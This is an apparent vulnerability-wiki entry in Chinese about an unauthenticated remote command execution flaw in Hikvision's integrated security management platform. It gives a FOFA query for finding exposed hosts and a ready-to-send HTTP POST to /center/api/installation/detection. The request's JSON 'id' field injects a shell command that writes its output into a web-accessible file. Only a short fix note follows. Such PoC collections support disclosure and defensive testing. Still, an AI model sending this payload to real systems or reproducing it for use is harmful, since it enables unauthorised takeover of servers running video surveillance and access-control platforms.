---

source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 海康威视综合安防管理平台 detection 前台RCE漏洞

# 漏洞描述

海康威视综合安防管理平台 /center/api/installation/detection 接口处存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

影响范围

海康威视综合安防管理平台

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="HIKVISION-iSecure-Center"

POC/EXP：

POST /center/api/installation/detection HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/105.0.1249.139 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json;charset=UTF-8

{"type":"environment","operate":"","machines":{"id":  "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/ceshi.txt)"}}

把命令执行结果写入txt文件

![024e115d1225410ee04fb771e4511bb](./.resource/海康威视综合安防管理平台detection前台RCE漏洞/media/024e115d1225410ee04fb771e4511bb.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
